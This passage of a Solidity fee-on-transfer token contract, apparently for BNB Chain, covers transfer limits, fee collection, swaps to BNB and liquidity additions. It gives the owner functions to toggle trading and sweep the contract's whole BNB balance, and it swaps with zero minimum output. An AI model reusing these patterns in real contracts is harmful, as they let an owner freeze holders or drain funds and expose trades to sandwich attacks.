        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        // Total transfer allowance per transaction
        if (
            from != owner() &&
            to != owner() &&
            !isExcludedFromAmountLimitToken[from] &&
            !isExcludedFromAmountLimitToken[to]
        ) {
            require(
                amount <= maxTxAmount,
                "Transfer amount exceeds the maxTxAmount."
            );
        }

        // Total sales limit per tx
        if (
            !automatedMarketMakerPairs[from] &&
            automatedMarketMakerPairs[to] &&
            from != owner() &&
            to != owner() &&
            !isExcludedFromAmountLimitToken[from] &&
            !isExcludedFromAmountLimitToken[to]
        ) {
            require(
                amount <= maxSaleAmount,
                "Transfer amount exceeds the maxSaleAmount"
            );
        }

        // Total buy limit per tx
        if (
            automatedMarketMakerPairs[from] &&
            to != owner() &&
            !isExcludedFromAmountLimitToken[from] &&
            !isExcludedFromAmountLimitToken[to]
        ) {
            require(
                amount <= maxBuyAmount,
                "Transfer amount exceeds the maxBuyAmount"
            );
        }

        uint256 contractTokenBalance = balanceOf(address(this));
        if (contractTokenBalance >= maxTxAmount) {
            contractTokenBalance = maxTxAmount;
        }

        bool canSwap = contractTokenBalance >= swapTokensAtAmount;

        if (
            canSwap &&
            !swapping &&
            automatedMarketMakerPairs[to] &&
            swapAndLiquifyEnabled
        ) {
            swapping = true;
            tokenToMarketing = marketingFeeTotal;
            tokenToDevelopment = developmentFeeTotal;
            tokenToProject = projectFeeTotal;
            tokenToLiquidity = liquidityFeeTotal;

            // When we send liquidity we sell half of the tokens and the other half is used for addition in the liquidity pair.
            uint256 halfTokenToLiquidity = liquidityFeeTotal > 0
                ? liquidityFeeTotal.div(2)
                : 0;

            // Stores the total tokens that will be sold, to generate the share of each fee later.
            tokenToSwap = tokenToMarketing
                .add(tokenToDevelopment)
                .add(tokenToProject)
                .add(halfTokenToLiquidity);

            uint256 tokenToSwapPlusLiq = tokenToSwap.add(halfTokenToLiquidity);
            // We sell in smaller tranches determined by the variable swapTokensAtAmount, we need to know what % liquidity of this total is to be sold.
            uint256 rateLiqFee = halfTokenToLiquidity.mul(10000).div(
                tokenToSwapPlusLiq
            );
            uint256 initialBalance = address(this).balance;
            uint256 swapTokensAtAmountSubLiq = swapTokensAtAmount.sub( // Found liquidity share from swapTokensAtAmount
                swapTokensAtAmount.mul(rateLiqFee).div(10000)
            );
            // Exchange tokens for BNB
            swapTokensForBNB(swapTokensAtAmountSubLiq);
            uint256 newBalance = address(this).balance.sub(initialBalance);

            // Determines the corresponding total of each fee in the new balance accrued in BNB
            uint256 marketingPart = newBalance.mul(tokenToMarketing).div(
                tokenToSwap
            );
            uint256 developmentPart = newBalance.mul(tokenToDevelopment).div(
                tokenToSwap
            );
            uint256 projectPart = newBalance.mul(tokenToProject).div(
                tokenToSwap
            );

            // What remains will be used for liquidity
            uint256 liquidityPart = newBalance
                .sub(marketingPart)
                .sub(developmentPart)
                .sub(projectPart);

            // Adjusts the total used of each token per fee in this liquidity transaction
            if (marketingPart > 0) {
                payable(marketingWalletAddress).transfer(marketingPart);
                marketingFeeTotal = marketingFeeTotal.sub(
                    swapTokensAtAmount.mul(tokenToMarketing).div(
                        tokenToSwapPlusLiq
                    )
                );
            }

            if (developmentPart > 0) {
                payable(developmentWalletAddress).transfer(developmentPart);
                developmentFeeTotal = developmentFeeTotal.sub(
                    swapTokensAtAmount.mul(tokenToDevelopment).div(
                        tokenToSwapPlusLiq
                    )
                );
            }

            if (projectPart > 0) {
                payable(projectWalletAddress).transfer(projectPart);
                projectFeeTotal = projectFeeTotal.sub(
                    swapTokensAtAmount.mul(tokenToProject).div(
                        tokenToSwapPlusLiq
                    )
                );
            }

            // Add liquidity to pancakeswap
            if (liquidityPart > 0) {
                addLiquidity(
                    halfTokenToLiquidity,
                    liquidityPart,
                    _lpDestination
                );

                liquidityFeeTotal = liquidityFeeTotal.sub(
                    swapTokensAtAmount.mul(tokenToLiquidity).div(
                        tokenToSwapPlusLiq
                    )
                );
            }
            swapping = false;
        }

        bool takeFee = !swapping;

        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }

        // Collects the tokens/fees that will be transformed into liquidity at the correct time.
        if (takeFee) {
            (
                uint256 transferToContractFee,
                uint256 burnFeeTx,
                uint256 transferedToWalletFee
            ) = collectFee(
                    from,
                    amount,
                    automatedMarketMakerPairs[to],
                    !automatedMarketMakerPairs[from] &&
                        !automatedMarketMakerPairs[to]
                );

            if (transferToContractFee > 0)
                super._transfer(from, address(this), transferToContractFee);
            if (burnFeeTx > 0) _burn(from, burnFeeTx);

            amount = amount.sub(transferToContractFee).sub(burnFeeTx).sub(
                transferedToWalletFee
            );
        }

        super._transfer(from, to, amount);
    }

    /**
     * Calculates the fee amounts that will be held in the contract for later generation of liquidity and distribution
     **/
    function collectFee(
        address from,
        uint256 amount,
        bool sell,
        bool p2p
    )
        private
        returns (
            uint256 transferToContractFee,
            uint256 burnFeeTx,
            uint256 transferedToWalletFee
        )
    {
        uint256 liquifyFeeNew = amount
            .mul(
                p2p ? liquidityFee[2] : sell ? liquidityFee[1] : liquidityFee[0]
            )
            .div(10000);

        liquidityFeeTotal = liquidityFeeTotal.add(liquifyFeeNew);

        uint256 projectFeeNew = amount
            .mul(p2p ? projectFee[2] : sell ? projectFee[1] : projectFee[0])
            .div(10000);

        if (swapAndLiquifyEnabled)
            projectFeeTotal = projectFeeTotal.add(projectFeeNew);
        else if (projectFeeNew > 0)
            super._transfer(from, projectWalletAddress, projectFeeNew);

        uint256 marketingFeeNew = amount
            .mul(
                p2p ? marketingFee[2] : sell ? marketingFee[1] : marketingFee[0]
            )
            .div(10000);

        if (swapAndLiquifyEnabled)
            marketingFeeTotal = marketingFeeTotal.add(marketingFeeNew);
        else if (marketingFeeNew > 0)
            super._transfer(from, marketingWalletAddress, marketingFeeNew);

        uint256 developmentFeeNew = amount
            .mul(
                p2p ? developmentFee[2] : sell
                    ? developmentFee[1]
                    : developmentFee[0]
            )
            .div(10000);

        if (swapAndLiquifyEnabled)
            developmentFeeTotal = developmentFeeTotal.add(developmentFeeNew);
        else if (developmentFeeNew > 0)
            super._transfer(from, developmentWalletAddress, developmentFeeNew);

        burnFeeTx = amount
            .mul(p2p ? burnFee[2] : sell ? burnFee[1] : burnFee[0])
            .div(10000);

        transferToContractFee = swapAndLiquifyEnabled
            ? liquifyFeeNew.add(projectFeeNew).add(marketingFeeNew).add(
                developmentFeeNew
            )
            : liquifyFeeNew;

        transferedToWalletFee = !swapAndLiquifyEnabled
            ? projectFeeNew.add(marketingFeeNew).add(developmentFeeNew)
            : 0;
    }

    /**
     * Swaps contract tokens into BNB
     **/
    function swapTokensForBNB(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    /**
     *  Adds liquidity to DEX
     **/
    function addLiquidity(
        uint256 tokenAmount,
        uint256 ethAmount,
        address account
    ) internal {
        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage
            0, // slippage
            account,
            block.timestamp
        );
    }

    function canTrade( bool allow ) public onlyOwner {
        setCanTrade( allow );
    }

    /**
     * Send any remaining BNB that is in the contract.
     **/
    function sendDustBNB(address payable _recipient) public onlyOwner {
        _recipient.transfer(address(this).balance);
    }
}